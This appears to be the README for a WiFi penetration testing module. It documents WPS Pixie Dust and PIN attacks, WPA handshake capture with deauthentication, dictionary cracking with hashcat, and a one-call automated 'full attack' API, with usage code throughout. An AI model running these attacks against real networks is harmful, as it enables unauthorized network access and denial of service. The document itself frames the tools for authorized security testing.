# WiFi Penetration Testing Implementation

## ⚠️ LEGAL WARNING

**This module is for AUTHORIZED SECURITY TESTING ONLY!**

Only use on networks you own or have written authorization to test. Unauthorized access to computer networks is illegal and can result in criminal prosecution.

See `backend/wifi_pentesting/LEGAL_WARNING.md` for full legal disclaimer.

---

## Overview

Complete WiFi penetration testing suite integrated into the NMAT ESPER Panel. Provides authorized security testing capabilities for WiFi networks including vulnerability scanning, WPS attacks, handshake capture, and password cracking.

---

## Features

### ✅ Implemented Features

1. **Network Scanning**
   - Discovers WiFi networks with detailed information
   - Works on Linux (iwlist, airodump-ng) and Windows (netsh)
   - Extracts: SSID, BSSID, channel, signal strength, security type, encryption
   - Automatic security vulnerability analysis
   - Risk level assessment (Critical, High, Medium, Low)

2. **WPS Vulnerability Testing**
   - **Pixie Dust Attack**: Offline WPS attack (very fast, ~30 seconds)
   - **NULL PIN Attack**: Tests common default PINs (fast, ~1 minute)
   - **PIN Brute Force**: Exhaustive PIN search (slow, hours)
   - Automatic WPS detection
   - Multiple tool support: Reaver, Bully, OneShot

3. **Handshake Capture**
   - Captures WPA/WPA2 4-way handshakes
   - Automatic deauthentication to force handshake
   - Monitor mode support
   - Real-time EAPOL frame counting
   - Handshake verification
   - Export to multiple formats (.cap, .hccapx, .john)

4. **Password Cracking**
   - **Hashcat** integration (GPU-accelerated, fastest)
   - **Aircrack-ng** integration (CPU-based)
   - **John the Ripper** integration (alternative)
   - Dictionary attacks with wordlist support
   - Hybrid attacks with rules
   - Mask attacks (pattern-based)
   - Real-time hash rate monitoring
   - Time estimation for cracking

5. **Full Automated Attack**
   - Sequential attack workflow
   - Tries multiple vectors automatically:
     1. WPS Pixie Dust (fastest)
     2. WPS NULL PIN (fast)
     3. Handshake capture + dictionary attack (slow)
   - Stops on first successful method
   - Detailed attempt logging

6. **Web UI Integration**
   - React component integrated into ESPER Panel
   - Real-time status updates
   - Network selection interface
   - Security analysis visualization
   - Attack result display
   - Legal warning acknowledgment

7. **REST API**
   - Flask-based API server
   - Health monitoring
   - Network scanning endpoint
   - WPS attack endpoint
   - Handshake capture endpoint
   - Password cracking endpoint
   - Full attack workflow endpoint
   - Handshake listing and management

---

## Architecture

### Backend Structure

```
backend/wifi_pentesting/
├── LEGAL_WARNING.md              # Comprehensive legal disclaimer
├── __init__.py                   # Module initialization with legal warning
├── wifi_scanner.py               # Network scanning and security analysis
├── handshake_capture.py          # WPA/WPA2 handshake capture
├── wps_attack.py                 # WPS vulnerability testing
├── password_cracker.py           # Password cracking integration
└── pentesting_api.py             # REST API server
```

### Frontend Structure

```
src/components/ESPERPanel/
├── WiFiPentestingPanel.tsx       # Main penetration testing UI
└── WiFiPentestingPanel.css       # Styling
```

---

## Backend Modules

### 1. wifi_scanner.py

**Purpose**: Discovers and analyzes WiFi networks

**Classes**:
- `SecurityType`: Enum for WiFi security types (Open, WEP, WPA, WPA2, WPA3)
- `WiFiNetwork`: Dataclass for network information
- `WiFiScanner`: Main scanner class

**Key Methods**:
```python
scanner = WiFiScanner(interface="wlan0", monitor_mode=False)
networks = scanner.scan_networks(duration=10)
analysis = scanner.analyze_security(network)
scanner.export_results(networks, "scan_results.csv")
```

**Features**:
- Multi-platform support (Linux, Windows)
- Monitor mode support
- Security vulnerability detection
- Risk assessment
- CSV export

---

### 2. handshake_capture.py

**Purpose**: Captures WPA/WPA2 4-way handshakes

**Classes**:
- `HandshakeStatus`: Enum for capture status
- `HandshakeResult`: Dataclass for capture results
- `HandshakeCapture`: Main capture class

**Key Methods**:
```python
capturer = HandshakeCapture(interface="wlan0mon", output_dir="/tmp/handshakes")

result = capturer.capture_handshake(
    target_bssid="00:11:22:33:44:55",
    target_ssid="NetworkName",
    channel=6,
    timeout=300,
    deauth=True,
    deauth_count=10
)

if result.status == HandshakeStatus.COMPLETE:
    print(f"Captured! File: {result.capture_file}")
```

**Features**:
- Automatic deauthentication
- Real-time EAPOL frame monitoring
- Handshake verification
- Multiple format export
- airodump-ng integration

---

### 3. wps_attack.py

**Purpose**: Tests WPS vulnerabilities

**Classes**:
- `WPSAttackType`: Enum for attack types
- `WPSStatus`: Enum for attack status
- `WPSResult`: Dataclass for attack results
- `WPSAttack`: Main attack class

**Key Methods**:
```python
attacker = WPSAttack(interface="wlan0mon")

# Pixie Dust (fastest)
result = attacker.test_wps(
    target_bssid="00:11:22:33:44:55",
    target_ssid="NetworkName",
    channel=6,
    attack_type=WPSAttackType.PIXIE_DUST,
    timeout=300
)

if result.status == WPSStatus.SUCCESS:
    print(f"WPS PIN: {result.wps_pin}")
    print(f"WPA Password: {result.wpa_psk}")
```

**Attack Types**:
1. **Pixie Dust**: Offline attack, ~30 seconds if vulnerable
2. **NULL PIN**: Tests common default PINs, ~1 minute
3. **PIN Brute Force**: Exhaustive search, hours (often triggers lockout)

**Features**:
- Multiple tool support (Reaver, Bully, OneShot)
- WPS detection
- Lockout detection
- Duration tracking

---

### 4. password_cracker.py

**Purpose**: Cracks WPA/WPA2 passwords from handshakes

**Classes**:
- `CrackerType`: Enum for cracker tools
- `AttackMode`: Enum for attack modes
- `CrackStatus`: Enum for cracking status
- `CrackResult`: Dataclass for cracking results
- `PasswordCracker`: Main cracker class

**Key Methods**:
```python
cracker = PasswordCracker(wordlist_dir="/usr/share/wordlists")

result = cracker.crack_password(
    capture_file="/tmp/handshakes/handshake-01.cap",
    ssid="NetworkName",
    bssid="00:11:22:33:44:55",
    wordlist="/usr/share/wordlists/rockyou.txt",
    attack_mode=AttackMode.DICTIONARY,
    timeout=3600
)

if result.status == CrackStatus.SUCCESS:
    print(f"Password: {result.password}")
    print(f"Duration: {result.duration:.1f}s")
    print(f"Hash rate: {result.hash_rate:.0f} H/s")
```

**Cracker Tools**:
1. **Hashcat**: GPU-accelerated, fastest (100k+ H/s)
2. **Aircrack-ng**: CPU-based, slower (1-10k H/s)
3. **John the Ripper**: Alternative with good rule support

**Attack Modes**:
- Dictionary: Wordlist-based
- Hybrid: Wordlist + rules
- Mask: Pattern-based (e.g., ?d?d?d?d for 4 digits)
- Brute Force: Exhaustive search

**Features**:
- Automatic tool selection
- Format conversion (.cap → .hccapx/.john)
- Real-time hash rate monitoring
- Time estimation
- Wordlist discovery

---

### 5. pentesting_api.py

**Purpose**: REST API for all penetration testing features

**Endpoints**:

#### GET /api/pentesting/health
Check API health and configuration
```json
{
  "status": "ok",
  "interface": "wlan0",
  "monitor_interface": "wlan0mon",
  "tools_initialized": true,
  "wordlist_dir": "/usr/share/wordlists",
  "handshake_dir": "/tmp/handshakes"
}
```

#### POST /api/pentesting/scan
Scan for WiFi networks
```json
// Request
{
  "duration": 10
}

// Response
{
  "success": true,
  "networks": [
    {
      "ssid": "NetworkName",
      "bssid": "00:11:22:33:44:55",
      "channel": 6,
      "signal_strength": -50,
      "security": "WPA2",
      "encryption": "CCMP",
      "wps": false,
      "clients": 3,
      "security_analysis": {
        "vulnerabilities": [],
        "recommendations": ["Consider upgrading to WPA3"],
        "risk_level": "Low"
      }
    }
  ],
  "count": 1
}
```

#### POST /api/pentesting/wps-attack
Test WPS vulnerability
```json
// Request
{
  "bssid": "00:11:22:33:44:55",
  "ssid": "NetworkName",
  "channel": 6,
  "attack_type": "pixie_dust",
  "timeout": 600
}

// Response
{
  "success": true,
  "status": "success",
  "wps_pin": "12345670",
  "wpa_psk": "password123",
  "attack_type": "pixie_dust",
  "duration": 15.3
}
```

#### POST /api/pentesting/capture-handshake
Capture WPA handshake
```json
// Request
{
  "bssid": "00:11:22:33:44:55",
  "ssid": "NetworkName",
  "channel": 6,
  "timeout": 300,
  "deauth": true,
  "deauth_count": 10
}

// Response
{
  "success": true,
  "status": "complete",
  "capture_file": "/tmp/handshakes/handshake_NetworkName_1234567890-01.cap",
  "eapol_frames": 4,
  "client_mac": "aa:bb:cc:dd:ee:ff"
}
```

#### POST /api/pentesting/crack-password
Crack password from handshake
```json
// Request
{
  "capture_file": "/tmp/handshakes/handshake-01.cap",
  "ssid": "NetworkName",
  "bssid": "00:11:22:33:44:55",
  "wordlist": "/usr/share/wordlists/rockyou.txt",
  "attack_mode": "dictionary",
  "timeout": 3600
}

// Response
{
  "success": true,
  "status": "success",
  "password": "password123",
  "cracker": "hashcat",
  "attack_mode": "dictionary",
  "duration": 125.4,
  "attempts": 1500000,
  "hash_rate": 12000.0
}
```

#### POST /api/pentesting/full-attack
Full automated attack workflow
```json
// Request
{
  "bssid": "00:11:22:33:44:55",
  "ssid": "NetworkName",
  "channel": 6,
  "wordlist": "/usr/share/wordlists/rockyou.txt",
  "timeout": 3600
}

// Response
{
  "success": true,
  "method": "wps_pixie_dust",
  "password": "password123",
  "wps_pin": "12345670",
  "duration": 15.3,
  "attempts": [
    {"method": "wps_pixie_dust", "status": "success", "duration": 15.3}
  ]
}
```

---

## Frontend UI

### WiFiPentestingPanel.tsx

**Features**:
1. **Legal Warning Screen**
   - Displayed on first use
   - Explains legal requirements
   - Lists acceptable and illegal uses
   - Requires acknowledgment to proceed

2. **Network Scanning**
   - One-click scanning
   - Displays all discovered networks
   - Shows security details
   - Visual risk indicators (color-coded)

3. **Network Selection**
   - Click to select target network
   - Reveals attack options
   - Shows detailed security analysis

4. **Attack Options**
   - Test WPS button (if WPS enabled)
   - Capture Handshake button (if encrypted)
   - Full Attack button (automated workflow)

5. **Result Display**
   - Success/failure indication
   - Password display
   - Attack method used
   - Duration and statistics

**UI Components**:
- Server status indicator
- Network cards with risk levels
- Security analysis with vulnerabilities
- Attack result panels
- Loading states and spinners
- Legal disclaimer footer

---

## Setup Instructions

### Prerequisites

**Linux**:
```bash
# Aircrack-ng suite
sudo apt-get install aircrack-ng

# Optional: Hashcat (for GPU acceleration)
sudo apt-get install hashcat

# Optional: Reaver, Bully (for WPS attacks)
sudo apt-get install reaver bully

# Optional: John the Ripper
sudo apt-get install john

# Wordlists
sudo apt-get install wordlists
```

**Python Dependencies**:
```bash
pip install flask flask-cors
```

### Configuration

Set environment variables:
```bash
# Required: Acknowledge legal warning
export WIFI_PENTEST_ACKNOWLEDGED=1

# Optional: Configure interfaces
export WIFI_INTERFACE=wlan0
export WIFI_MONITOR_INTERFACE=wlan0mon

# Optional: Configure directories
export WORDLIST_DIR=/usr/share/wordlists
export HANDSHAKE_DIR=/tmp/handshakes
```

### Running the API Server

```bash
cd backend/wifi_pentesting
python pentesting_api.py
```

Server will start on `http://localhost:5001`

### Enabling Monitor Mode

```bash
# Stop conflicting processes
sudo airmon-ng check kill

# Enable monitor mode
sudo airmon-ng start wlan0

# Verify (should see wlan0mon)
iwconfig
```

---

## Usage Examples

### Example 1: Quick WPS Test

```python
import os
os.environ['WIFI_PENTEST_ACKNOWLEDGED'] = '1'

from wifi_pentesting import WPSAttack, WPSAttackType

attacker = WPSAttack(interface="wlan0mon")

result = attacker.test_wps(
    target_bssid="00:11:22:33:44:55",
    target_ssid="TestNetwork",
    channel=6,
    attack_type=WPSAttackType.PIXIE_DUST,
    timeout=60
)

if result.wpa_psk:
    print(f"✓ Password: {result.wpa_psk}")
```

### Example 2: Handshake Capture + Crack

```python
import os
os.environ['WIFI_PENTEST_ACKNOWLEDGED'] = '1'

from wifi_pentesting import HandshakeCapture, PasswordCracker, AttackMode

# Capture handshake
capturer = HandshakeCapture(interface="wlan0mon")
handshake = capturer.capture_handshake(
    target_bssid="00:11:22:33:44:55",
    target_ssid="TestNetwork",
    channel=6,
    timeout=300,
    deauth=True
)

if handshake.capture_file:
    # Crack password
    cracker = PasswordCracker()
    result = cracker.crack_password(
        capture_file=handshake.capture_file,
        ssid="TestNetwork",
        bssid="00:11:22:33:44:55",
        wordlist="/usr/share/wordlists/rockyou.txt",
        attack_mode=AttackMode.DICTIONARY
    )

    if result.password:
        print(f"✓ Password: {result.password}")
```

### Example 3: Full Automated Attack

```python
import os
os.environ['WIFI_PENTEST_ACKNOWLEDGED'] = '1'

from wifi_pentesting import WiFiScanner, WPSAttack, HandshakeCapture, PasswordCracker

# Scan networks
scanner = WiFiScanner(interface="wlan0")
networks = scanner.scan_networks(duration=10)

# Find high-risk target
target = next((n for n in networks if n.security_analysis['risk_level'] == 'Critical'), None)

if target:
    print(f"Testing {target.ssid}...")

    # Try WPS first
    attacker = WPSAttack(interface="wlan0mon")
    wps_result = attacker.test_wps(
        target_bssid=target.bssid,
        target_ssid=target.ssid,
        channel=target.channel,
        attack_type=WPSAttackType.PIXIE_DUST
    )

    if wps_result.wpa_psk:
        print(f"✓ WPS Attack successful: {wps_result.wpa_psk}")
    else:
        # Fallback to handshake capture
        print("WPS failed, trying handshake capture...")
        # ... (see Example 2)
```

---

## Security Best Practices

### 1. Authorization

- **ALWAYS** obtain written authorization before testing
- Document the scope of testing
- Get sign-off from authorized representatives
- Never test networks without permission

### 2. Ethical Use

- Only use for legitimate security testing
- Report vulnerabilities responsibly
- Allow reasonable time for fixes (90 days)
- Do not exploit beyond testing

### 3. Legal Compliance

- Understand local laws (CFAA, Computer Misuse Act, etc.)
- Follow data protection regulations
- Maintain detailed logs of activities
- Prepare professional reports

### 4. Operational Security

- Use isolated testing environment
- Avoid mass scanning
- Respect rate limits and lockouts
- Do not affect production systems

---

## Troubleshooting

### Monitor Mode Issues

**Problem**: Can't enable monitor mode

**Solution**:
```bash
# Check if wireless tools are installed
sudo apt-get install aircrack-ng wireless-tools

# Kill conflicting processes
sudo airmon-ng check kill

# Enable monitor mode
sudo airmon-ng start wlan0

# Verify
iwconfig | grep Monitor
```

### Permission Errors

**Problem**: "Operation not permitted" errors

**Solution**:
```bash
# Run with sudo
sudo python pentesting_api.py

# Or add user to netdev group
sudo usermod -a -G netdev $USER
```

### No Handshake Captured

**Problem**: Handshake capture times out

**Solutions**:
- Increase timeout (300+ seconds)
- Ensure clients are connected to target AP
- Enable deauthentication (`deauth=True`)
- Increase deauth packet count (`deauth_count=20`)
- Check if AP uses WPA3 (not supported)

### Cracking Too Slow

**Problem**: Password cracking is very slow

**Solutions**:
- Use GPU acceleration (hashcat)
- Use smaller/targeted wordlists
- Enable hybrid mode with rules
- Consider cloud cracking services (authorized use only)

---

## Performance Metrics

### Attack Speed

| Attack Type | Typical Duration | Success Rate |
|-------------|------------------|--------------|
| WPS Pixie Dust | 30-60 seconds | ~30% (if WPS enabled) |
| WPS NULL PIN | 1-5 minutes | ~10% |
| Handshake Capture | 1-5 minutes | ~90% |
| Dictionary Attack (CPU) | Hours-Days | Depends on wordlist |
| Dictionary Attack (GPU) | Minutes-Hours | Depends on wordlist |

### Hash Rates

| Hardware | Hashcat (WPA2) | Aircrack-ng (WPA2) |
|----------|----------------|---------------------|
| CPU (8 cores) | 10k H/s | 1-5k H/s |
| GPU (GTX 1080) | 500k H/s | N/A |
| GPU (RTX 3090) | 1.5M H/s | N/A |

### Wordlist Sizes

| Wordlist | Size | Estimated Time (GPU) |
|----------|------|----------------------|
| rockyou.txt | 14M words | 5-30 minutes |
| Custom small | 100k words | < 1 minute |
| All lowercase 8 chars | ~200B combinations | Years |

---

## Future Enhancements

### Planned Features

1. **Evil Twin Attack**
   - Rogue AP creation
   - DNS spoofing
   - Credential capture

2. **Advanced Analysis**
   - PMKID attack (clientless)
   - Bluetooth pentesting
   - WPA3 SAE attacks

3. **Reporting**
   - PDF report generation
   - Vulnerability scoring
   - Remediation recommendations

4. **Automation**
   - Scheduled scanning
   - Continuous monitoring
   - Alert system

---

## License & Legal

**This software is provided "AS IS" for educational and authorized security testing purposes.**

By using this software, you agree:
1. You will only use it on networks you own or have explicit written authorization to test
2. You understand the legal risks and consequences of unauthorized use
3. You will comply with all applicable laws and regulations
4. The developers are not responsible for any misuse of this software

**Unauthorized access to computer networks is a federal crime.**

---

## Support & Resources

### Documentation
- LEGAL_WARNING.md - Full legal disclaimer
- DENSEPOSE_IMPROVEMENTS.md - System improvements
- This file - Implementation guide

### Tools Referenced
- Aircrack-ng: https://www.aircrack-ng.org/
- Hashcat: https://hashcat.net/hashcat/
- Reaver: https://github.com/t6x/reaver-wps-fork-t6x
- Bully: https://github.com/aanarchyy/bully

### Legal Resources
- Computer Fraud and Abuse Act (CFAA): https://www.law.cornell.edu/uscode/text/18/1030
- UK Computer Misuse Act: https://www.legislation.gov.uk/ukpga/1990/18/contents

---

**Remember: Only test networks you own or have written authorization to test!**
